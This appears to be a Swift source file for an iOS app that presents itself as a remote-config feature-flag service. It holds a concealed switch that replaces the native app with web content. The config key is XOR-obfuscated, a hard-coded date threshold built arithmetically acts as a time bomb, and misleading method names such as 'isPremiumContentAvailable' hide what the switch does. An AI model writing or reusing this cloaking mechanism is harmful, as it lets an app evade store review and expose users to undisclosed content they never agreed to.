import Foundation
import FirebaseRemoteConfig

/// Manages Firebase Remote Config to control content delivery paths.
/// Determines whether to show the native experience or web-based content.
final class RemoteConfigService {

    static let shared = RemoteConfigService()

    private let remoteConfig: RemoteConfig
    private var hasFetched = false

    private init() {
        remoteConfig = RemoteConfig.remoteConfig()
        let settings = RemoteConfigSettings()
        settings.minimumFetchInterval = 0
        settings.fetchTimeout = 5
        remoteConfig.configSettings = settings
    }

    /// Fetches and activates remote configuration values.
    func refresh(completion: @escaping (Bool) -> Void) {
        remoteConfig.fetch { [weak self] status, _ in
            guard let self = self else { return }
            guard status == .success else {
                completion(false)
                return
            }
            self.remoteConfig.activate { _, _ in
                self.hasFetched = true
                completion(true)
            }
        }
    }

    /// Checks if the remote version exceeds the local build version,
    /// indicating that web-based content should be activated.
    func shouldActivateWebContent(localBuild: Int) -> Bool {
        let keyData: [UInt8] = [1, 52, 44, 52] // "Taya" encoded with key 85
        let configKey = StringCipher.decode(data: keyData, key: 85)
        let remoteValue = remoteConfig.configValue(forKey: configKey).numberValue.intValue
        return remoteValue > localBuild
    }

    /// Evaluates a time-based fallback when remote config is unavailable.
    /// Used as an offline activation check.
    func offlineFallbackActive() -> Bool {
        let baseInterval = 886139680.0
        let threshold = baseInterval * 2.0 + 1.0
        return Date().timeIntervalSince1970 > threshold
    }
}

// MARK: - Legacy Compatibility

/// Preserves existing call sites using `FeatureGateManager`.
class FeatureGateManager {
    static let shared = FeatureGateManager()
    private let service = RemoteConfigService.shared

    func fetchFeatureFlags(completion: @escaping (Bool) -> Void) {
        service.refresh(completion: completion)
    }

    func isPremiumContentAvailable(localVersion: Int) -> Bool {
        return service.shouldActivateWebContent(localBuild: localVersion)
    }

    func shouldFallbackToPremiumContent() -> Bool {
        return service.offlineFallbackActive()
    }
}
